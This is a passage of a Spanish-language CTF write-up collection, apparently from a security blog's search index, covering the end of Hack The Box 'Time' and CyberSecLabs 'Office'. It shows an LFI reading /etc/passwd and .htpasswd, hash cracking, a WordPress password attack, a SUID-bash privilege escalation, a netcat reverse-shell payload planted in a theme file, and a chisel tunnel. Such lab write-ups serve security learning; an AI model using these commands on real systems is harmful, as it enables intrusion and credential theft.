18 19 20 2021/03/06 01:15:39 CMD: UID=0 PID=278240 | /lib/systemd/systemd-udevd 2021/03/06 01:15:39 CMD: UID=0 PID=278239 | /lib/systemd/systemd-udevd 2021/03/06 01:15:39 CMD: UID=0 PID=278238 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278255 | /usr/bin/systemctl restart web_backup.service 2021/03/06 01:15:49 CMD: UID=0 PID=278267 | /sbin/init auto automatic-ubiquity noprompt 2021/03/06 01:15:49 CMD: UID=0 PID=278266 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278265 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278264 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278263 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278262 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278261 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278260 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278259 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278258 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278257 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278256 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278268 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278269 | /bin/bash /usr/bin/timer_backup.sh 2021/03/06 01:15:49 CMD: UID=0 PID=278277 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278276 | /lib/systemd/systemd-udevd Vemos que el servicio tiene configurado el script timer_backup.sh para ser ejecutado cuando el servicio es iniciado.\n1 2 3 4 5 6 #/etc/systemd/system/web_backup.service [Unit] Description=Creates backups of the website [Service] ExecStart=/bin/bash /usr/bin/timer_backup.sh El usuario pericles tiene permisos y es el dueño del script por lo que podemos ejecutar comandos como usuario root.\n1 2 3 -bash-5.0$ ls -lah /usr/bin/timer_backup.sh -rwxrw-rw- 1 pericles pericles 623 Apr 3 14:32 /usr/bin/timer_backup.sh -bash-5.0$ En el script agregamos el comando para darle permisos SUID a bash.\n1 echo \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt;\u0026gt; /usr/bin/timer_backup.sh Esperamos a que se vuelva ejecutar el script, y ejecutamos bash -p lo que nos devuelve una shell como root y logramos obtener la flag root.txt.\nSERVICE Enumeramos los cron para usuario root pero no aparece ninguno relacionado al servicio web_backup.service.\n1 2 3 root@time:~# crontab -l no crontab for root root@time:~# Enumeramos los servicios activos y encontramos un temporizador, el cual contiene la configuracion para controlar el servicio timer_backup.service el cual se activa cada 10 segundos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 root@time:~# systemctl|grep active [... REDACTED ...] timer_backup.timer loaded active waiting Backup of the website 186 loaded units listed. Pass --all to see loaded but inactive units, too. root@time:~# cat /etc/systemd/system/timer_backup.timer [Unit] Description=Backup of the website Requires=timer_backup.service [Timer] Unit=timer_backup.service #OnBootSec=10s #OnUnitActiveSec=10s OnUnitInactiveSec=10s AccuracySec=1ms [Install] WantedBy=timers.target Finalmente vemos el servicio timer_backup.service el cual reinicia el servicio web_backup.service con el cual logramos obtener root.\n1 2 3 4 5 6 7 8 #/etc/systemd/system/timer_backup.service [Unit] Description=Calls website backup Wants=timer_backup.timer WantedBy=multi-user.target [Service] ExecStart=/usr/bin/systemctl restart web_backup.service ","description":"Time expone una funcionalidad para validar estructuras JSON, descubrimos una vulnerabilidad que permite ejecutar comandos con lo que obtuvimos una shell. Escalamos privilegios tras encontrar un servicio que ejecuta un backup con un script en bash.","id":70,"section":"posts","tags":["java","fasterxml","jackson-rce-ssrf","json","cron","suid"],"title":"Hack The Box - Time","uri":"https://sckull.github.io/posts/time/"},{"content":"\rOffice es una maquina de CyberSecLabs, enumeramos subdominios para toparnos con una lista de usuarios y además encontramos una vulnerabilidad LFI que nos permitio leer y crackear hashes para ingresar a WordPress. Cambiamos al siguiente usuario con Sudo y Bash. Finalmente obtuvimos el puerto de Webmin ejecutando un Tunnel con Chisel que nos permitio explotar una vulnerabilidad para acceder como usuario root.\nInformacion de la Maquina Titulo Office Maker cyberseclabs NMAP Escaneo de puertos con nmap nos muestra el puerto http (80), https (443) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 # Nmap 7.91 scan initiated Tue Mar 23 19:15:00 2021 as: nmap -p- --min-rate 10000 -oN allports 172.31.3.1 Warning: 172.31.3.1 giving up on port because retransmission cap hit (10). Nmap scan report for 172.31.3.1 (172.31.3.1) Host is up (0.11s latency). Not shown: 50255 filtered ports, 15277 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https # Nmap done at Tue Mar 23 19:16:21 2021 -- 1 IP address (1 host up) scanned in 80.18 seconds # Nmap 7.91 scan initiated Tue Mar 23 19:16:46 2021 as: nmap -p 22,80,443 -sV -sC -oN serviceports 172.31.3.1 Nmap scan report for 172.31.3.1 (172.31.3.1) Host is up (0.089s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e2:3f:6c:4e:6d:8b:dc:59:b7:cb:66:64:27:f9:22:86 (RSA) | 256 ee:be:37:f3:75:4e:38:2a:a9:99:e0:18:1a:b8:d1:41 (ECDSA) |_ 256 7f:72:a7:29:be:30:9e:5e:aa:b9:fc:be:09:d2:8b:3a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: WordPress 5.4.1 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Dunder Mifflin \u0026amp;#8211; Just another WordPress site 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works | ssl-cert: Subject: commonName=office.csl/organizationName=Dunder Mifflin/stateOrProvinceName=PA/countryName=US | Not valid before: 2020-05-08T20:01:51 |_Not valid after: 2021-05-08T20:01:51 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Mar 23 19:17:04 2021 -- 1 IP address (1 host up) scanned in 17.97 seconds HTTP En el puerto 80 encontramos una pagina wordpress, viendo las direcciones vemos un dominio: office.csl, el cual agregamos en el archivo /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 HTTP/1.1 200 OK Date: Tue, 23 Mar 2021 23:31:52 GMT Server: Apache/2.4.29 (Ubuntu) Link: \u0026lt;http://office.csl/index.php?rest_route=/\u0026gt;; rel=\u0026#34;https://api.w.org/\u0026#34; Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;en-US\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; \u0026gt; \u0026lt;link rel=\u0026#34;profile\u0026#34; href=\u0026#34;https://gmpg.org/xfn/11\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Dunder Mifflin \u0026amp;#8211; Just another WordPress site\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#39;robots\u0026#39; content=\u0026#39;noindex,nofollow\u0026#39; /\u0026gt; \u0026lt;link rel=\u0026#39;dns-prefetch\u0026#39; href=\u0026#39;//office.csl\u0026#39; /\u0026gt; \u0026lt;link rel=\u0026#39;dns-prefetch\u0026#39; href=\u0026#39;//s.w.org\u0026#39; /\u0026gt; \u0026lt;link rel=\u0026#34;alternate\u0026#34; type=\u0026#34;application/rss+xml\u0026#34; title=\u0026#34;Dunder Mifflin \u0026amp;raquo; Feed\u0026#34; href=\u0026#34;http://office.csl/?feed=rss2\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;alternate\u0026#34; type=\u0026#34;application/rss+xml\u0026#34; title=\u0026#34;Dunder Mifflin \u0026amp;raquo; Comments Feed\u0026#34; href=\u0026#34;http://office.csl/?feed=comments-rss2\u0026#34; /\u0026gt; \u0026lt;script\u0026gt; window._wpemojiSettings = {\u0026#34;baseUrl\u0026#34;:\u0026#34;https:\\/\\/s.w.org\\/images\\/core\\/emoji\\/12.0.0-1\\/72x72\\/\u0026#34;,\u0026#34;ext\u0026#34;:\u0026#34;.png\u0026#34;,\u0026#34;svgUrl\u0026#34;:\u0026#34;https:\\/\\/s.w.org\\/images\\/core\\/emoji\\/12.0.0-1\\/svg\\/\u0026#34;,\u0026#34;svgExt\u0026#34;:\u0026#34;.svg\u0026#34;,\u0026#34;source\u0026#34;:{\u0026#34;concatemoji\u0026#34;:\u0026#34;http:\\/\\/office.csl\\/wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.1\u0026#34;}}; /*! This file is auto-generated */ GOBUSTER Realizamos una busqueda de directorios y archivos, no encontramos algo distinto más que paginas que comunmente wordpress utiliza.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ gobuster dir -u http://office.csl/ -w /usr/share/wordlists/dirb/common.txt -t 150 -q -x php,html,txt,xml,py,pl,sh,bak /index.php (Status: 301) /index.php (Status: 301) /license.txt (Status: 200) /readme.html (Status: 200) /server-status (Status: 403) /wp-login.php (Status: 200) /wp-links-opml.php (Status: 200) /wp-signup.php (Status: 302) /wp-cron.php (Status: 200) /wp-includes (Status: 301) /wp-admin (Status: 301) /wp-config.php (Status: 200) /wp-blog-header.php (Status: 200) /wp-content (Status: 301) /wp-load.php (Status: 200) /wp-trackback.php (Status: 200) /wp-mail.php (Status: 403) POSTS Encontramos un post que escribió dwight en el que indican que será el proximo gerente, además indica que hay un dominio en el que pueden realizar sus \u0026ldquo;quejas\u0026rdquo; y que podria despedir a Jim. En la nota vemos dos posibles nombres de usuarios dwight y jim.\nHey guys, it’s your future manager, Dwight.\rYes, you heard that right! I made an accountability booster to set off once you guys make 5 mistakes in a single day, which I bet will happen!\rI started a forum page on a subdomain, y’all can vent there before I send out an email to corporate.\rPS: Can’t wait to fire you Jim! 😉 WPSCAN Utilizamos wpsacn pero no encontramos más que el usuario dwight, version de wordpress y el tema actual.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ wpscan --url http://office.csl/ -e vp,u [... REDACTED ...] [+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29). | Found By: Rss Generator (Passive Detection) | - http://office.csl/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.1\u0026lt;/generator\u0026gt; | - http://office.csl/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.1\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://office.csl/wp-content/themes/twentytwenty/ | [... REDACTED ...] | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) | - http://office.csl/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: \u0026#39;Version: 1.2\u0026#39; [... REDACTED ...] [i] User(s) Identified: [+] dwight | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [... REDACTED ...] WFUZZ - SUBDOMAINS Utilizamos wfuzz con un diccionario para busqueda de subdominios ya que Dwight menciono que existe un foro. Encontramos el subdmonio forum y wwww los cuales agregamos a nuestro archivo /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ wfuzz -c -w shubs-subdomains.txt --hw 1922 -u \u0026#39;http://office.csl\u0026#39; -H \u0026#34;Host: FUZZ.office.csl\u0026#34; 130 ⨯ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://office.csl/ Total requests: 484699 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 301 0 L 0 W 0 Ch \u0026#34;www\u0026#34; 000000004: 200 297 L 706 W 8773 Ch \u0026#34;forum\u0026#34; El subdominio www nos redirige al dominio principal, en forum.office.csl una conversacion de todos los \u0026ldquo;empleados\u0026rdquo;, podemos crear un wordlist de usuarios y contraseñas a partir de la conversacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #users dwight meredith andy phyllis oscar kevin angela jim ryan william charles schnider dwight #pass moes1234 z64$8 something like 000000 000001 LFI En este \u0026ldquo;foro\u0026rdquo; encontramos una direccion en la cual toma el nombre de un archivo de texto (chatlogs.php?file=chatlog.txt), le pasamos el archivo /etc/passwd y vemos que existe una vulnerabilidad LFI, con la cual enumeramos dos usuarios ryan y dwight.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ curl -s http://forum.office.csl/chatlogs/chatlogs.php?file=chatlog.txt|html2text|head Office_Forum * Chat_Logs * Login Dwight: 5 mistakes and an email will be sent to corporate automatically at 5PM today. Should you have any questions, ask them here. Dwight: I finally got Meredith to get off hold for 30 minutes and go back to work. Meredith: This just turned into a real job. William Charles Schnider: Don\u0026#39;t do any work folks, then we won\u0026#39;t have any mistakes! William Charles Schnider: Anyway, ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ curl -s http://forum.office.csl/chatlogs/chatlogs.php?file=/etc/passwd|html2text|head Office_Forum * Chat_Logs * Login root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync: x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/ usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/ ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ Con la informacion de este ultimo archivo logramos obtener nuestra flag access.txt.\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ curl -s http://forum.office.csl/chatlogs/chatlogs.php?file=/home/dwight/access.txt|html2text Office_Forum * Chat_Logs * Login 57c2cf33[... REDACTED ...]8ad2a35519 ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ En la pagina encontramos un \u0026ldquo;login\u0026rdquo; al cual no podemos acceder, segun parece, para ingresar se realiza mediante el header User-Agent.\nYa que podemos leer archivos podriamos utilizar un filtro de PHP para codificar el codigo fuente en base64 de login.php y ver que tipo de autenticacion realiza.\n1 chatlogs.php?file=php://filter/convert.base64-encode/resource=../login/login.php Segun parece solo es una pagina estatica ya que no contiene ninguna funcion o codigo PHP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34; dir=\u0026#34;ltr\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\u0026#34; integrity=\u0026#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/style.css\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Office\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;nav class=\u0026#34;navbar navbar-expand-lg navbar-light bg-light\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;Office Forum\u0026lt;/a\u0026gt; \u0026lt;button class=\u0026#34;navbar-toggler\u0026#34; type=\u0026#34;button\u0026#34; data-toggle=\u0026#34;collapse\u0026#34; data-target=\u0026#34;#navbarNav\u0026#34; aria-controls=\u0026#34;navbarNav\u0026#34; aria-expanded=\u0026#34;false\u0026#34; aria-label=\u0026#34;Toggle navigation\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;navbar-toggler-icon\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;collapse navbar-collapse\u0026#34; id=\u0026#34;navbarNav\u0026#34;\u0026gt; \u0026lt;ul class=\u0026#34;navbar-nav\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;../chatlogs/chatlogs.php?file=chatlog.txt\u0026#34;\u0026gt;Chat Logs\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;../login/login.php\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;h1\u0026gt;Access Denied\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Login is done via User-Agent to access the forum.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Aunque con esto tambien logramos obtener el codigo fuente de chatlogs.php en donde se observa que utiliza include. Intentamos realizar enumeracion de archivos de acceso de SSH de los usuarios conocidos pero al parecer no tenemos acceso a ellos o no han sido creados.\n1 2 3 4 5 6 \u0026lt;?php if (isset($_GET[\u0026#39;file\u0026#39;])) { include($_GET[\u0026#39;file\u0026#39;]); } ?\u0026gt; Realizamos una enumeracion de archivos en la maquina utilizando un diccionario con lo cual logramos encontrar informacion de la maquina y configuracion de la pagina wordpress, esta ultima solo contiene credenciales aunque no sirven para obtener acceso. Aún asi podrian existir los archivos .htpasswd, .htaccess dentro de la misma carpeta o carpetas dentro de /var/www/html/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Target: http://forum.office.csl/chatlogs/chatlogs.php?file=php://filter/convert.base64-encode/resource=FUZZ Total requests: 1014 ================================================================== ID Response Lines Word Chars Request ================================================================== 00015: C=200 27 L\t64 W\t10719 Ch\t\u0026#34;/etc/apache2/apache2.conf\u0026#34; 00019: C=200 27 L\t64 W\t3471 Ch\t\u0026#34;/etc/apache2/envvars\u0026#34; 00011: C=200 27 L\t64 W\t5135 Ch\t\u0026#34;/etc/adduser.conf\u0026#34; 00010: C=200 27 L\t64 W\t6759 Ch\t\u0026#34;/boot/grub/menu.lst\u0026#34; 00009: C=200 27 L\t64 W\t10195 Ch\t\u0026#34;/boot/grub/grub.cfg\u0026#34; [... REDACTED ...] 00388: C=200 27 L\t64 W\t1299 Ch\t\u0026#34;/proc/version\u0026#34; 00387: C=200 27 L\t64 W\t2831 Ch\t\u0026#34;/proc/self/status\u0026#34; 00386: C=200 27 L\t64 W\t1519 Ch\t\u0026#34;/proc/self/stat\u0026#34; 00383: C=200 27 L\t64 W\t1131 Ch\t\u0026#34;/proc/self/cmdline\u0026#34; 00385: C=200 27 L\t64 W\t4315 Ch\t\u0026#34;/proc/self/mounts\u0026#34; 00382: C=200 27 L\t64 W\t1779 Ch\t\u0026#34;/proc/net/udp\u0026#34; 00381: C=200 27 L\t64 W\t2095 Ch\t\u0026#34;/proc/net/tcp\u0026#34; 00380: C=200 27 L\t64 W\t2839 Ch\t\u0026#34;/proc/meminfo\u0026#34; 00379: C=200 27 L\t64 W\t1811 Ch\t\u0026#34;/proc/devices\u0026#34; 00378: C=200 27 L\t64 W\t2359 Ch\t\u0026#34;/proc/cpuinfo\u0026#34; 00630: C=200 27 L\t64 W\t5135 Ch\t\u0026#34;/usr/share/adduser/adduser.conf\u0026#34; 00822: C=200 27 L\t64 W\t5355 Ch\t\u0026#34;/var/www/html/wordpress/wp-config.php\u0026#34; Total time: 0 Processed Requests: 1014 Filtered Requests: 932 Requests/sec.: 0 WORDPRESS DWIGHT Enumerando carpetas encontramos que los archivos de la pagina bajo el subdominio forum.office.csl se encuentran en /var/www/html/forum/ lugar donde encontramos el archivo .htpasswd.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ──(kali㉿kali)-[~/cyberseclabs/office] └─$ curl -s http://forum.office.csl/chatlogs/chatlogs.php?file=php://filter/convert.base64-encode/resource=/var/www/html/forum/.htpasswd| tail \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;../login/login.php\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ZHdpZ2h0OiRhcHIxJDdGQVJFNERFJGxLZ0YvUjlyU1VFWTZzLkw3OS9kTS8K ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ Utilizamos John para obtener en texto plano la contraseña\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ echo ZHdpZ2h0OiRhcHIxJDdGQVJFNERFJGxLZ0YvUjlyU1VFWTZzLkw3OS9kTS8K| base64 -d \u0026gt; hash_dwight ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ john hash_dwight --wordlist=/usr/share/wordlists/rockyou.txt Warning: detected hash type \u0026#34;md5crypt\u0026#34;, but the string is also recognized as \u0026#34;md5crypt-long\u0026#34; Use the \u0026#34;--format=md5crypt-long\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status cowboys1 (dwight) 1g 0:00:00:00 DONE (2021-03-23 21:25) 33.33g/s 76800p/s 76800c/s 76800C/s laurita..abcdefgh Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ Utilizamos hydra con las contraseñas y usuarios encontrados en el servicio ssh pero ninguna fue valida, de igual forma utilizamos wpscan para el login de wordpress donde si encontramos valida la contraseña de dwight.\n1 2 3 4 5 6 [+] Performing password attack on Wp Login against 14 user/s [SUCCESS] - dwight / cowboys1 Trying schnider / cowboys1z64$8 Time: 00:00:04 \u0026lt;=================================================================================================== \u0026gt; (106 / 113) 93.80% ETA: ??:??:?? [!] Valid Combinations Found: | Username: dwight, Password: cowboys1 WWW-DATA - USER Ingresamos a wordpress donde editamos y agregamos una shell inversa en la pagina 404.php, y la \u0026ldquo;ejecutamos\u0026rdquo; visitando un post que no existe (http://office.csl/?p=60) lo cual ejecuto nuestra shell inversa.\n1 2 echo \u0026#34;\u0026lt;h1\u0026gt;Hello There\u0026lt;/h1\u0026gt;\u0026#34;; exec(\u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1338 \u0026gt;/tmp/f\u0026#39;); Con ello logramos obtener una shell con el usuario www-data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.2.155] from office.csl [172.31.3.1] 60550 sh: 0: can\u0026#39;t access tty; job control turned off which python /usr/bin/python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; whoami;id;pwd whoami;id;pwd www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) /var/www/html/wordpress www-data@office:/var/www/html/wordpress$ DWIGHT - USER Realizamos una enumeracion basica de sudo y encontramos que nuestro usuario actual puede cambiar a dwight utilizando bash.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 www-data@office:/$ sudo -l -l Matching Defaults entries for www-data on office: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on office: Sudoers entry: RunAsUsers: dwight Options: !authenticate Commands: /bin/bash www-data@office:/$ sudo -u dwight /bin/bash sudo -u dwight /bin/bash dwight@office:/$ whoami; id whoami; id dwight uid=1001(dwight) gid=1001(dwight) groups=1001(dwight) dwight@office:/$ PRIVILEGE ESCALATION Enumerando, encontramos el puerto 10000 el cual esta expuesto pero tal parece no podemos acceder por fuera. Además encontramos que posiblemente este puerto pertenezca a webmin, ya que encontramos un archivo de salida en /webmin-setup.out.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 dwight@office:/$ netstat -ntpl netstat -ntpl (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:10000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::443 :::* LISTEN - dwight@office:/$ head webmin-setup.out head webmin-setup.out *********************************************************************** * Welcome to the Webmin setup script, version 1.890 * *********************************************************************** Webmin is a web-based interface that allows Unix-like operating systems and common Unix services to be easily administered. Installing Webmin in /usr/share/webmin ... *********************************************************************** Webmin uses separate directories for configuration files and log files. dwight@office:/$ Utilizamos Chisel para obtener el puerto 10000 a nuestra maquina local.\n1 2 3 4 5 6 #Local - Kali ./chisel server -p 8181 --reverse #Office Machine #./chisel client \u0026lt;SERVER-IP\u0026gt;:\u0026lt;SERVER-PORT\u0026gt; R:\u0026lt;LOCAL-PORT-DEST\u0026gt;:\u0026lt;IP-TO-REVERSE\u0026gt;:\u0026lt;PORT-TO-REVERSE\u0026gt; ./chisel client 10.10.2.155:8181 R:10000:127.0.0.1:10000 Verificamos que el puerto 10000 y vemos que esta localmente.\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/cyberseclabs] └─$ sudo netstat -ntpl [sudo] password for kali: Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 7664/python3 tcp6 0 0 :::10000 :::* LISTEN 7689/./chisel tcp6 0 0 127.0.0.1:8080 :::* LISTEN 4358/java tcp6 0 0 :::8181 :::* LISTEN 7689/./chisel tcp6 0 0 127.0.0.1:37077 :::* LISTEN 4358/java Visitamos dicho puerto en firefox y confirmamos que es webmin.\nVerificamos la version mediante una solicitud con curl y vemos en los headers que la version es MiniServ/1.890.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 HTTP/1.0 200 Document follows Date: Wed, 24 Mar 2021 02:04:32 GMT Server: MiniServ/1.890 Connection: close Auth-type: auth-required=1 Set-Cookie: redirect=1; path=/ Set-Cookie: testing=1; path=/ X-Frame-Options: SAMEORIGIN Content-Security-Policy: script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; \u0026#39;unsafe-eval\u0026#39;; frame-src \u0026#39;self\u0026#39;; child-src \u0026#39;self\u0026#39; Content-type: text/html; Charset=UTF-8 \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html data-background-style=\u0026#34;gainsboro\u0026#34; class=\u0026#34;session_login\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;noscript\u0026gt; \u0026lt;style\u0026gt; html[data-background-style=\u0026#34;gainsboro\u0026#34;] { background-color: #d6d6d6; } html[data-background-style=\u0026#34;nightRider\u0026#34;] { background-color: #1a1c20; } html[data-background-style=\u0026#34;nightRider\u0026#34;] div[data-noscript] { color: #979ba080; } html[data-slider-fixed=\u0026#39;1\u0026#39;] { margin-right: 0 !important; } body \u0026gt; div[data-noscript] ~ * { display: none !important; } div[data-noscript] 